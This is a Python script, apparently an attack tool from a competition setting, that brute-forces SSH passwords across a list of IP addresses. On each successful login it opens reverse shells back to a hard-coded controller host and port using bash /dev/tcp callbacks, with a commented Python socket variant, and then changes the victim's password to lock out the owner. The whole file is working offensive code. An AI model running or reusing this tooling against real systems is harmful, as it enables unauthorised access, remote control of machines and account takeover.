# -*- coding: utf-8 -*-
# Created by restran on 2016/10/10
from __future__ import unicode_literals, absolute_import

"""
# 加上gevent的monkey.patch_all()，不然会出现如下错误
# Paramiko fails to connect due to greenlet error 'This operation would block forever'
"""
from gevent import monkey

monkey.patch_all()

import logging
import traceback
import paramiko
import os
import sys
import time
from threading import Thread

# 把项目的目录加入的环境变量中，这样才可以导入 common.base
sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.base import read_dict, TaskExecutor

logger = logging.getLogger(__name__)

"""
ssh 弱口令爆破
"""

ip_list = read_dict('ip.txt', clear_none=True)
username_list = ['neil']
found_password = []
new_password = 'Fassw0rd5791'
new_password_success = []
# 开启一个反弹 shell，对应的控制端 ip 和 端口
reverse_shell_ip = '10.60.3.202'
reverse_shell_port = '8080'
reverse_shell_port_2 = '8000'


def send_shell_command(shell, cmd, expect_end=None, timeout=1):
    """
    执行 shell 命令并获取返回结果
    :param timeout:
    :param shell:
    :param cmd:
    :param expect_end:
    :return:
    """

    def receive():
        buff = ''
        if expect_end is None:
            buff = shell.recv(9999)
        else:
            while not buff.endswith(expect_end):
                resp = shell.recv(9999)
                buff += resp
        try:
            logger.info(buff.decode('utf-8'))
        except:
            logger.info(buff)
        return buff

    logger.info(cmd)
    shell.send(cmd)
    time.sleep(timeout)
    receive()


def alter_password_cmd(ssh_client, old_password):
    # exec_command 没法执行 su - ，无法切换到 root，改用 shell
    shell = ssh_client.invoke_shell()
    time.sleep(1)
    send_shell_command(shell, 'passwd \n')
    # 因为 root 用户执行完命令后，命令行是 [root@qzmms ~]# 这种格式
    # 因此期待 ~]#  作为结束标记
    send_shell_command(shell, '%s\n' % old_password)
    send_shell_command(shell, '%s\n' % new_password)
    send_shell_command(shell, '%s\n' % new_password)


def reverse_shell_cmd(ssh_client):
    """
    创建一个后台运行的反弹 shell
    :param ssh_client:
    :return:
    """
    try:
        cmd = 'setsid bash -i >& /dev/tcp/%s/%s 0>&1\n' % (
            reverse_shell_ip, reverse_shell_port)
        # cmd = """setsid python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (reverse_shell_ip, reverse_shell_port)
        shell = ssh_client.invoke_shell()
        time.sleep(1)
        send_shell_command(shell, cmd)
        cmd = 'setsid bash -i >& /dev/tcp/%s/%s 0>&1\n' % (
            reverse_shell_ip, reverse_shell_port_2)
        send_shell_command(shell, cmd)
    except Exception as e:
        logger.error(e)


def weak_pass(password, ip, port=22, timeout=5):
    for name in username_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port, str(name), str(password), timeout=timeout)
            found_password.append((ip, password))
            logger.warning('[True ] %s %s:%s' % (ip, name, password))
            append_2_file('[True ] %s %s:%s' % (ip, name, password))
            try:
                reverse_shell_cmd(client)
                alter_password_cmd(client, password)
                logger.warning('修改密码成功 %s %s:%s' % (ip, name, new_password))
                append_2_file('修改密码成功 %s %s:%s' % (ip, name, new_password))
                new_password_success.append((ip, new_password))
            except Exception as ex:
                logger.info(ex)
                logger.warning('修改密码失败 %s %s' % (ip, name))
            return True
        except Exception as e:
            logger.info(e)
            logger.debug('[False] %s %s:%s' % (ip, name, new_password))

    return False


def append_2_file(message):
    with open('found_ssh.txt', 'a') as f:
        f.write(message + '\n')


def main():
    with open('found_ssh.txt', 'w') as f:
        f.write(str(''))

    password_list = read_dict('ssh_password.txt')
    for ip in ip_list:
        # 如果是爆破，max_workers 设置大一点
        executor = TaskExecutor(password_list, max_workers=2)
        # executor.run(weak_pass, ip)
        Thread(target=executor.run, args=(weak_pass, ip)).start()

        # for t in found_password:
        #     logger.warning('%s old password is %s' % t)
        #
        # for t in new_password_success:
        #     logger.warning('%s new password is %s' % t)


if __name__ == '__main__':
    main()
